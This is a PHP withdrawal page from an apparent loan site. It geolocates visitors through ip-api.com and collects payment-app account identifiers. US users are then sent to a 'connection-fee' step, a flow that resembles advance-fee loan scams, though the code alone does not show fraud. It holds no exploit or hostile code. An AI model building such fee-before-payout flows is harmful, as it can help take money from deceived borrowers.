<?php
session_start();
require '../config/db.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: ../login.php");
    exit();
}

/* GEO DETECTION */
$ip = $_SERVER['REMOTE_ADDR'];
$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));

$country = $geo->country ?? 'Unknown';
$_SESSION['country'] = $country;

$amount = $_SESSION['withdraw_amount'] ?? null;
?>

<?php include 'includes/header.php'; ?>
<?php include 'includes/navbar.php'; ?>

<div class="container">

    <div class="loan-form">

        <h2 style="text-align:center;margin-bottom:20px;">
            Withdraw Funds
        </h2>

        <!-- ALWAYS VISIBLE SUMMARY -->
        <div style="padding:15px;background:#f8fbff;border-left:5px solid var(--accent);border-radius:10px;margin-bottom:15px;">
            <strong>Detected Country:</strong> <?= htmlspecialchars($country) ?>
        </div>

        <?php if ($amount): ?>
        <div style="padding:15px;background:#eef7ff;border-left:5px solid #007bff;border-radius:10px;margin-bottom:20px;">
            <strong>Amount to Withdraw:</strong> <?= number_format($amount, 2) ?>
        </div>
        <?php endif; ?>

        <!-- STEP 1 -->
        <div id="step1">

            <p style="margin-bottom:20px;">
                Are you currently located outside the United States?
            </p>

            <div style="display:flex;gap:10px;flex-wrap:wrap;">

                <button class="submit-btn" onclick="showStep('fallback')">
                    Yes
                </button>

                <button class="submit-btn" style="background:#555;" onclick="showStep('usa')">
                    No
                </button>

            </div>

        </div>

        <!-- STEP 2 -->
        <div id="step2" style="display:none;"></div>

    </div>

</div>

<script>
function showStep(type) {

    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';

    let html = '';

    if (type === 'usa') {

        html = `
        <p>Select your US payment method:</p>

        <form method="POST" action="connection-fee.php">

            <input type="hidden" name="type" value="usa">
            <input type="hidden" name="country" value="United States">

            <div class="form-group">
                <label>Payment Method</label>
                <select name="method" required>
                    <option value="paypal">PayPal</option>
                    <option value="cashapp">Cash App</option>
                    <option value="venmo">Venmo</option>
                    <option value="zelle">Zelle</option>
                </select>
            </div>

            <div class="form-group">
                <label>Account Identifier</label>
                <input type="text" name="account" required>
            </div>

            <button class="submit-btn" type="submit">Continue</button>

        </form>`;
    }

    if (type === 'fallback') {

        html = `
        <p>Loading international payment methods...</p>

        <form method="POST" action="withdraw-methods.php?type=fallback">

            <input type="hidden" name="country" value="<?= htmlspecialchars($country) ?>">

            <div class="form-group">
                <label>Continue</label>
                <button class="submit-btn" type="submit">
                    Continue to Payment Setup
                </button>
            </div>

        </form>`;
    }

    document.getElementById('step2').innerHTML = html;
}
</script>

<?php include 'includes/footer.php'; ?>
